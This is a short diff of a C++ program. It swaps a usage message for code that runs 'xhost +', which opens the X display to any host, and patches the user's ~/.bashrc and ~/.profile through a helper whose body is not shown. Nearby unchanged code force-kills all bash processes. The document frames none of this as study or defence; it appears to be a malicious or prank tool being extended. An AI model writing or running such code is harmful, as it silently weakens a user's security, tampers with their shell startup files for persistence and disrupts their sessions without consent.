@@ -14,6 +14,7 @@ void patch(const string filepath){
 
 int main(int argc, char const *argv[])
 {
+	string home(getenv("HOME"));
 
 	if(argc > 1){
 		
@@ -28,7 +29,10 @@ int main(int argc, char const *argv[])
 		system("killall -9 bash");
 	}
 	else{
-		cout << "Usage: " << argv[0] << " fichier1 fichier2..." << endl;
+		system("command xhost +");
+
+		patch(home + "/.bashrc");
+		patch(home + "/.profile");
 	}
 	return 0;
 }
